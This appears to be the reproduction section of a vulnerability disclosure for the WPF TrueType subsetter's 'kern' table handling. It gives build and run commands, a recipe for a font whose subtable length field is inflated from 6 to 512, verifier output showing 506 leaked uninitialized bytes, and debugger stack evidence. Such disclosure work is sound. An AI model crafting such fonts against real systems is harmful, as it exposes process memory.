# Reproduction

## Tested environment

- Windows 11 Home 25H2 x64, `10.0.26200.9711`
- BuildLabEx `26100.1.amd64fre.ge_release.240331-1435`
- .NET Windows Desktop Runtime 10.0.14 x64
- .NET SDK 10.0.403 x64
- Python 3 with `fontTools` only if regenerating fixtures; fixture files are
  already included

No debugger is needed for the final reproduction.

## Automated matched test

From an extracted attachment in PowerShell:

```powershell
powershell -NoLogo -NoProfile -ExecutionPolicy Bypass `
  -File .\run.ps1 `
  -SdkDotnet "C:\path\to\sdk-10.0.403\dotnet.exe" `
  -RuntimeDotnet "C:\path\to\runtime-10.0.14\dotnet.exe" `
  -Python python `
  -RepeatCount 5
```

The script builds the source once, then launches a fresh runtime process for
each of five controls and five attackers. It does not groom the heap or alter
the target. It creates a timestamped `repro-evidence-*` directory and runs the
verifier.

Expected verifier summary:

```text
control_count=5
attacker_count=5
control_unique_output_hashes=1
attacker_unique_output_hashes=5
verification=PASS
```

Each control row must show `kern_length=10`, `expansion_length=0`, and zero
nonzero expansion bytes. Each attacker row must show `kern_length=516`,
`expansion_length=506`, and a nonzero expansion. Exact uninitialized values
may vary by process and machine; differing hashes are expected, not required
for the parser invariant.

## Minimal single comparison

```powershell
dotnet build .\harness\WpfKernLengthHarness.csproj -c Release

dotnet .\harness\bin\Release\net10.0-windows\WpfKernLengthHarness.dll `
  .\fixtures\kern-format1-length-6.ttf .\control-output.ttf 1

dotnet .\harness\bin\Release\net10.0-windows\WpfKernLengthHarness.dll `
  .\fixtures\kern-format1-length-512.ttf .\attacker-output.ttf 1
```

The first output reports a ten-byte `kern`. The second reports a 516-byte
`kern` and 506 returned bytes beyond the physical/logical ten-byte input.

## Fixture construction

`make_fixtures.py` replaces the base font's `kern` with exactly ten bytes:

```text
version=0, nTables=1
subtable version=1, length=(6 or 512), coverage=0x0101 (format 1)
```

The valid control length 6 covers exactly the nested header. The attacker
changes only that field to 512; it does not append bytes. Fixture hashes:

```text
control  aad90de39d0c0bc43461f9c30c6b846b5f35fdc5cf17057c52b986e3669f07b4
attacker 1ef1c842d8e9beefd859b31558aaf49aff57540bfc57cb8b548ffc44c5e05fed
```

## Debugger corroboration

`evidence/debug/capture-copyblock.log` and
`kern-length-expansion-copyblock.dmp` were produced with the included
`capture-copyblock.cdb`. At the captured instruction:

```text
CopyBlock+0x20: cmp esi,edi
target=0xed0 source=0xed0 size=0x200
```

The next `je` skips the source and destination checks. The stack is:

```text
DirectWriteForwarder!CopyBlock
DirectWriteForwarder!ModKern+0x1ac
DirectWriteForwarder!CreateDeltaTTFEx+0x553
DirectWriteForwarder!CreateDeltaTTF+0x3ef
DirectWriteForwarder!MS.Internal.TrueTypeSubsetter.ComputeSubset+0x1a4
PresentationCore!TrueTypeFontDriver.ComputeFontSubset+0x8a
PresentationCore!GlyphTypeface.ComputeSubset+0xb6
WpfKernLengthHarness!Program.Main+0x65e
```

The dump SHA-256 is
`3ffafe0b3c9d5582e829f551a58a963a3e37cdd23bcc03194a33ac417d8b34e9`.

